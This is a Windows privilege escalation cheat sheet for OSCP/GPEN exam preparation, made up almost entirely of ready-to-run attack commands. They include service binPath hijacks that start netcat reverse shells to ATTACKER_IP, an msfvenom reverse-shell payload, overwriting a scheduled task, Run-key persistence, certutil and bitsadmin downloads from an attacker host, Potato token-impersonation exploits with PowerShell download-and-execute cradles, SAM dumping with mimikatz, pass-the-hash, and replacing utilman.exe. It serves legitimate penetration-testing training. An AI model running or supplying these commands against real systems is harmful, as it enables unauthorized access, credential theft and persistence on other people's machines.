# Windows Privilege Escalation Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **systematic methodology for Windows privilege escalation** commonly encountered in **OSCP and GPEN exams**. The focus is on **enumeration first**, then identifying and exploiting misconfigurations.

Basic payload:

```
C:\WINDOWS\system32\cmd.exe /c net localgroup Administrators <username> /add
```

Privilege escalation on Windows is **primarily enumeration**.

---

# 0. Net Enumeration and Other Quick Useful Commands


```
net user
net user Administrator
net user bob
net user user1 Password123! /add
net user Administrator NewPassword123! // change a user password
net user Administrator /active:yes // Enable a disabled account
net user guest /active:no // Disable an account
net localgroup // List local groups
net localgroup administrators // View members of Administrators group
net localgroup administrators user1 /add // Add user to Administrators group
net localgroup administrators user1 /delete // Remove user from Administrators group
net user /domain // List domain users
net user alice /domain // View a domain user
net group "Domain Admins" /domain // View members of Domain Admins
net group "Domain Admins" bob /add /domain // Add a user to a domain group
net share // List shares on local machine
net share hacker=C:\temp /grant:everyone,FULL // Create a new share
net share hacker /delete // Delete a share
net session // View active sessions connected to machine
net view  // View computers in the domain/workgroup
net view \\192.168.1.10 // Enumerate shares on a remote host
net use \\TARGET\share // Mount SMB share
net use \\TARGET\share /user:DOMAIN\user Password123! // Authenticate with alternate credentials
net config workstation // View current domain
net config server // View server/service information
net start <Spooler> // Start a service
net stop <Spooler> // Stop a service
net accounts // View local password policy
net accounts /domain // View domain password policy
```

Other useful commands

```
:: USERS & GROUPS
net user
net user Administrator
net user user1 Password123! /add
net localgroup
net localgroup administrators
net localgroup administrators user1 /add
net user /domain
net group /domain
net group "Domain Admins" /domain

:: WHOAMI
whoami
whoami /all
whoami /priv
whoami /groups

:: SYSTEM ENUMERATION
hostname
systeminfo
wmic qfe
set

:: NETWORK ENUMERATION
ipconfig /all
route print
arp -a
netstat -ano
ipconfig /displaydns

:: SHARES & SMB
net share
net view
net view \\TARGET
net use
net use \\TARGET\share
net use Z: \\TARGET\share
net use Z: /delete

:: FIREWALL
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh advfirewall set allprofiles state on

:: SCHEDULED TASKS
schtasks
schtasks /query
schtasks /query /fo LIST /v
schtasks /create /sc minute /mo 1 /tn updater /tr C:\temp\shell.exe

:: SERVICES
sc query
sc qc Spooler
sc start Spooler
sc stop Spooler
sc config VulnService binPath= "C:\temp\shell.exe"

:: WMIC
wmic process list brief
wmic service list brief
wmic startup list full
wmic product get name,version
wmic useraccount get name,sid

:: PROCESSES
tasklist
tasklist /v
tasklist /svc
taskkill /PID 1234 /F

:: FILE HUNTING
dir proof.txt /s /b C:\
dir local.txt /s /b C:\
dir *.config /s /b
dir unattend.xml /s /b C:\
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.*

:: REGISTRY
reg query HKLM\Software
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

:: USERS & SESSIONS
query user
quser
qwinsta

:: CREDENTIAL HUNTING
cmdkey /list
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: POWERSHELL
powershell -ExecutionPolicy Bypass
powershell -enc BASE64

:: LOLBAS
certutil -urlcache -split -f http://attacker/shell.exe shell.exe
certutil -decode payload.b64 shell.exe
bitsadmin /transfer job http://attacker/file.exe C:\temp\file.exe

:: PERSISTENCE
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d C:\temp\shell.exe
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: ACTIVE DIRECTORY
nltest /domain_trusts
nltest /dclist:DOMAIN.LOCAL

:: RESTRICTED SHELL TRICKS
cmd.exe /c whoami
wmic process call create "cmd.exe /c whoami"

:: PASSWORD POLICY
net accounts
net accounts /domain

:: OPEN FILES & SESSIONS
net session
net file

:: SERVICES VIA NET
net start
net stop Spooler
net start Spooler
```

::winpeas
```
cmd.exe /c "winpeas.bat > winpeas-bat.txt 2>&1"
Get-Content .\winpeas-bat.txt -Tail 100
```

---

# 1. Basic System Enumeration

## Current User

```powershell
whoami
whoami /priv
whoami /groups
whoami /all
```

Check if the user has interesting privileges:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
https://github.com/gtworek/Priv2Admin
```

---

## System Information

```powershell
systeminfo
hostname
ver
```

Check OS version:

```powershell
wmic os get caption,version,buildnumber
```

Search exploit database:

```bash
searchsploit windows <version>
```

---

# 2. User and Group Enumeration

List users:

```powershell
net user
net user <username>
```

List groups:

```powershell
net localgroup
```

Check group members:

```powershell
net localgroup administrators
```

Current user information:

```powershell
net user <username>
```

---

# 3. Network Enumeration

Check network configuration:

```powershell
ipconfig /all
route print
arp -a
```

Active connections:

```powershell
netstat -ano
```

---

# 4. Running Processes

Check running processes:

```powershell
tasklist
```

Detailed process info:

```powershell
wmic process list full
```

Look for:

```
services running as SYSTEM
custom applications
scripts
```

---

# 5. Installed Programs

List installed software:

```powershell
wmic product get name,version,vendor
```

Registry method:

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

Check for vulnerable software versions.

---

# 6. Services Enumeration

List services:

```powershell
sc query
sc qc <service_name>
sc config <service_name> binPath="malicious.exe"
```

Detailed information:

```powershell
wmic service get name,displayname,pathname,startmode
```

Look for:

```
services running as SYSTEM
unquoted service paths
writable service executables
```

Create a reverse shell and service restart
```
for cmd: sc stop windowsscheduler
for cmd: sc start windowsscheduler
for powershell: sc.exe stop windowsscheduler
for powershell: sc.exe start windowsscheduler
```

---

# 7. Unquoted Service Path

Check services:

```powershell
wmic service get name,displayname,pathname,startmode
```

Example vulnerable path:

```
C:\Program Files\My Service\service.exe
```

Windows will attempt:

```
C:\Program.exe
C:\Program Files\My.exe
```

If writable → privilege escalation.

---

# 8. Weak Service Permissions (Writable Binary or Writable Binary Path)

Check service permissions:

### Writable Service Binary
```powershell
sc qc <service_name>
```

Check writable service binary:

```powershell
icacls "C:\path\to\service.exe"
```

If writable → replace executable.

### Writable Service Configuration

Check if we have privileges over that process. If so, you can change the binary path name.

```
Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
.\accesschk64.exe /accepteula -uwcqv <service_name>
sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```



Payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F // Remember to grant permissions to Everyone to execute your payload

```

### Start the service

```
net start <daclsvc_service_name>
sc stop windowsscheduler
sc start windowsscheduler
```

---

# 9. Scheduled Tasks

List scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for:

```
tasks running as SYSTEM
writable scripts via icacls. For ex, icacls c:\tasks\schtask.bat
```

If you can overwrite schtask.bat

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask //to run the scheduled task
```

---

# 10. Registry Permissions

Check registry permissions:

```powershell
reg query HKLM
```

Check writable registry keys.

---

# 11. AlwaysInstallElevated

Check registry keys:

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

If both values:

```
AlwaysInstallElevated = 1
```

Then install MSI as SYSTEM.

```
msiexec /i payload.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

# 12. Stored Credentials

Check saved credentials:

```powershell
cmdkey /list
```

Use stored credentials:

```powershell
runas /savecred /user:administrator cmd
```

---

# 13. Credential Files

Search for credentials:

```powershell
findstr /si password *.txt *.xml *.config
```

Search system:

```powershell
dir /s *password*
dir /s/b local.txt
dir /s/b *.log
tree /f /a Administrator
```

---

# 14. Registry Credentials

Check registry:

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

# 15. Unattended Installation Files

Check for unattended files:

```powershell
dir C:\ /s /b | findstr unattended.xml
```

Common files:

```
unattend.xml
sysprep.xml
```

---

# 16. PowerShell History

Check history:

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

# 17. File Permissions

Check writable files:

```powershell
icacls C:\path\file
```

Check directories:

```powershell
accesschk.exe -uws "Everyone" *
```

---

# 18. Token Privileges

Check token privileges:

```powershell
whoami /priv
```

If present:

```
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

Use impersonation exploits (e.g., token impersonation techniques). \
SeImpersonatePrivilege -> PrintSpoofer64.exe and GodPotato

## Get JuicyPotato (Legacy)

Get the exe from: https://github.com/ohpe/juicy-potato/releases
Get the netcat exe from: https://github.com/int0x33/nc.exe/

```
.\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
potato32.exe -t * -l 1337 -p C:\Users\Public\nc.exe -a "-e cmd.exe 10.10.15.150 5555" -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

## Get GodPotato (Use this)

Link: https://github.com/BeichenDream/GodPotato?source=post_page-----10b91a94c580---------------------------------------

```
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

```
.\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 10.130.85.61 1234"
```

Reverse shell with Nishang powershell
```
./GodPotato-NET4.exe -cmd "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.15.236:8000/Invoke-PowerShellTcp.ps1')"
```

Donwload nc.exe from https://github.com/int0x33/nc.exe/blob/master/nc.exe?source=post_page-----10b91a94c580---------------------------------------

## Learn installed dotnet version

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

> **Prerequisite:** `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`) must be enabled.

| Windows Version | First Choice | Alternatives | Notes |
|-----------------|-------------|--------------|-------|
| **Windows 7 / Server 2008 R2** | **JuicyPotato** | RottenPotato, SweetPotato | Classic DCOM token impersonation. |
| **Windows Server 2012 / 2012 R2** | **JuicyPotato** | SweetPotato | JuicyPotato is usually the first choice. |
| **Windows Server 2016 / Windows 10 (<1809)** | **JuicyPotato** | SweetPotato | DCOM abuse still works. |
| **Windows 10 (1809+) / Server 2019** | **PrintSpoofer** | GodPotato, RoguePotato, SweetPotato | JuicyPotato is generally ineffective due to DCOM changes. |
| **Windows 11 / Server 2022** | **GodPotato** | PrintSpoofer, SweetPotato | GodPotato has broad support for modern Windows versions. |

---

# 19. DLL Hijacking

Check for applications loading missing DLLs.

Use Process Monitor to identify:

```
NAME NOT FOUND
```

Place malicious DLL in writable directory.

---

# 20. PATH Variable Abuse

Check PATH:

```powershell
echo %PATH%
```

If writable directory exists earlier in PATH → place malicious executable.

---

# 21. Automatic Enumeration Tools

Useful tools:

```
winPEAS (https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
Seatbelt
SharpUp
https://github.com/itm4n/PrivescCheck
https://github.com/bitsadmin/wesng
Metasploit (multi/recon/local_exploit_suggester)
```

Example:

```powershell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.114.88.43:8181/PowerUp.ps1'); Invoke-AllChecks"
python3 wes.py systeminfo.txt -e
python3 wes.py systeminfo.txt --muc-lookup
```

---

# 22. Quick Enumeration Commands

Run immediately after obtaining a shell:

```powershell
whoami
whoami /priv
systeminfo
net user
net localgroup administrators
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
cmdkey /list
```

---

# 23. Important Locations to Inspect

Check these directories:

```
C:\Program Files
C:\Program Files (x86)
C:\Windows\System32
C:\Users
C:\Temp
```

Look for:

```
scripts
config files
passwords
```

---

# 24. Common PrivEsc Paths in Exams

Typical OSCP/GPEN privilege escalation vectors:

```
Unquoted service path
Weak service permissions
AlwaysInstallElevated
Writable scheduled tasks
Credential discovery
Token impersonation
DLL hijacking
```

---

# 25. Recommended Enumeration Workflow

```
1. Check user privileges
2. Check system information
3. Enumerate services
4. Check scheduled tasks
5. Check credentials
6. Check writable files
7. Check registry
8. Check installed software
```

---

# 26. Harvesting Passwords From Usual Spots

## Unattended Windows Installations

Look for files below
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## CMD History
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Powershell History
```
Get-History
```

## IIS Configuration
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

# 27. Cross Compilation


```
sudo pacman -S mingw-w64-gcc
x86_64-w64-mingw32-g++ hello.c -static -o hello
i686-w64-mingw32-gcc hello.c -static -o hello
```

---

# 28. SAM Dump with SeBackupPrivilege

## Dump SAM and SYSTEM

If a compromised user has SeBackupPrivilege and SeRestorePrivilege, the attacker can dump the SAM database used by the LSASS process.

```
reg save hklm\sam C:\Users\<username>\Desktop\SAM.hive
reg save hklm\system C:\Users\<username>\Desktop\SYSTEM.hive
```

If you have enough privilege, use Mimikatz to dump the hashes.

```
mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

Send them to Kali.

```
https://github.com/can-ozkan/PenetrationTesting/blob/main/FileTransfer.md#7-smb-file-transfer-with-smbserverpy
```

Then, use secretsdump

```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Then, do pass the hash

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.113.185.188
```

## Dump NTDS.DIT and SYSTEM

Link: https://github.com/k4sth4/SeBackupPrivilege

```
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

---

# 29. Abusing SeTakeOwnership Privilege
We can abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. To replace utilman, we will start by taking ownership of it with the following command:

```
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
copy cmd.exe utilman.exe
```

To trigger utilman, we will lock our screen from the start button. And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:


# 30. Final Advice

Privilege escalation on Windows is usually **misconfiguration**, not exploitation.

Always ask:

```
What runs as SYSTEM?
What files can I modify?
What executes automatically?
```

The more thoroughly you enumerate, the faster you escalate privileges.

# 31. Additional Resources

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://github.com/gtworek/Priv2Admin
https://github.com/antonioCoco/RogueWinRM
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://decoder.cloud/
https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
https://github.com/gtworek/Priv2Admin
```
